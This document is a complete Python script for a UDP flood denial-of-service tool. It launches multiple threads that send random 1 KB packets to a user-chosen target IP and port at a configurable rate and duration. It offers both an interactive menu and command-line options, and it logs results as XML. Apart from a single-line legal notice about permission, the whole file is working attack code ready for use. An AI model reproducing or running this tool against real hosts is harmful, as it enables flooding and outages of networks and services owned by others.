#!/usr/bin/env python3
# UDP Flood Attack

import argparse
import socket
import random
import threading
import time
import os
import signal
import sys
from datetime import datetime

# Global flag to handle graceful termination
running = True

def dict_to_xml(tag, d):
    """Converts a dictionary to a simple XML string."""
    parts = [f"<{tag}>"]
    for key, value in d.items():
        if isinstance(value, dict):
            parts.append(dict_to_xml(key, value))
        else:
            parts.append(f"<{key}>{value}</{key}>")
    parts.append(f"</{tag}>")
    return ''.join(parts)

class UDPFlooder:
    def __init__(self, target_ip, target_port, duration, packet_rate):
        """Initialize the UDP flooder with the target configuration."""
        self.target_ip = target_ip
        self.target_port = target_port
        self.attack_duration = duration
        self.packet_rate = packet_rate
        self.threads = 10  # Number of threads for sending UDP packets
        self.running = False
        self.start_time = None
        self.log_dir = "/var/log/network_tests"
        os.makedirs(self.log_dir, exist_ok=True)
        self.log_file = os.path.join(self.log_dir, f"udp_flood_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xml")
        self.stats = {
            'udp_packets_sent': 0,
            'errors': 0,
            'start_time': None,
            'end_time': None
        }

    def _log_event(self, event_type, message):
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'type': event_type,
            'message': message,
            'stats': self.stats.copy()
        }
        try:
            with open(self.log_file, 'a') as f:
                xml_entry = dict_to_xml('log', log_entry)
                f.write(xml_entry + '\n')
        except Exception as e:
            print(f"[LOG ERROR] {str(e)}")

    def generate_random_data(self):
        """Generates random data to send in the UDP packet."""
        return random._urandom(1024)  # 1024 bytes of random data

    def send_udp_packet(self):
        """Sends UDP packets to the target IP and port."""
        end_time = time.time() + self.attack_duration
        while self.running and time.time() < end_time:
            try:
                # Create a random packet
                data = self.generate_random_data()
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(data, (self.target_ip, self.target_port))
                sock.close()

                # Track the packets sent
                self.stats['udp_packets_sent'] += 1
                time.sleep(1 / self.packet_rate)
            except Exception as e:
                self.stats['errors'] += 1
                self._log_event('UDP_ERROR', str(e))
                time.sleep(0.001)

    def udp_flood(self):
        """Start the UDP flood attack using multiple threads."""
        self._log_event('UDP_START', 'Starting UDP flood attack')
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.send_udp_packet)
            t.daemon = True
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

    def start(self):
        """Starts the attack."""
        self.running = True
        self.stats['start_time'] = datetime.now().isoformat()
        self.start_time = time.time()

        print(f"\n🔧 Attack Configuration:")
        print(f"   • Target IP: {self.target_ip}")
        print(f"   • Target Port: {self.target_port}")
        print(f"   • Duration: {self.attack_duration}s")
        print(f"   • Packet Rate: {self.packet_rate} pps per thread")
        print(f"   • Log File: {self.log_file}\n")

        try:
            self.udp_flood()
        except KeyboardInterrupt:
            print("\n🛑 Attack interrupted by user!")

        self.stop()

    def stop(self):
        """Stop the attack."""
        self.running = False
        self.stats['end_time'] = datetime.now().isoformat()
        self._log_event('TEST_END', 'UDP flood attack completed')

        duration = time.time() - self.start_time
        print("\n\n📊 Final Report:")
        print(f"   • Actual Duration: {duration:.1f}s")
        print(f"   • UDP Packets Sent: {self.stats['udp_packets_sent']}")
        print(f"   • Errors: {self.stats['errors']}")
        print(f"   • Full log available at: {self.log_file}\n")

def signal_handler(sig, frame):
    """Graceful exit handler."""
    global running
    print("\n🛑 Received interrupt signal!")
    running = False
    sys.exit(0)

def menu():
    """Interactive menu mode."""
    print("\n⚠️ LEGAL NOTICE: Use this script only in your own network or with explicit permission!\n")
    target_ip = input("Enter target IP address: ").strip()
    target_port = int(input("Enter target UDP port (usually 53 for DNS, 80 for HTTP, etc.): ").strip())
    duration = int(input("Enter attack duration in seconds: ").strip())
    packet_rate = int(input("Enter packet rate (packets per second per thread): ").strip())

    # Create and start the UDP flooder
    flooder = UDPFlooder(target_ip, target_port, duration, packet_rate)
    flooder.start()

def terminal():
    """Terminal mode using arguments."""
    parser = argparse.ArgumentParser(description="UDP Flood Attack Tool")
    parser.add_argument("-t", "--target", type=str, required=True, help="Target IP address.")
    parser.add_argument("-p", "--port", type=int, required=True, help="Target UDP port.")
    parser.add_argument("-d", "--duration", type=int, default=120, help="Attack duration in seconds (default: 120).")
    parser.add_argument("-r", "--rate", type=int, default=1000, help="Packet rate per thread in packets per second (default: 1000).")

    args = parser.parse_args()

    target_ip = args.target
    target_port = args.port
    duration = args.duration
    packet_rate = args.rate

    flooder = UDPFlooder(target_ip, target_port, duration, packet_rate)
    flooder.start()

def main():
    """Main function to handle both interactive and terminal modes."""
    signal.signal(signal.SIGINT, signal_handler)

    if len(sys.argv) > 1:
        terminal()  # Terminal mode
    else:
        menu()  # Interactive menu mode

if __name__ == "__main__":
    main()
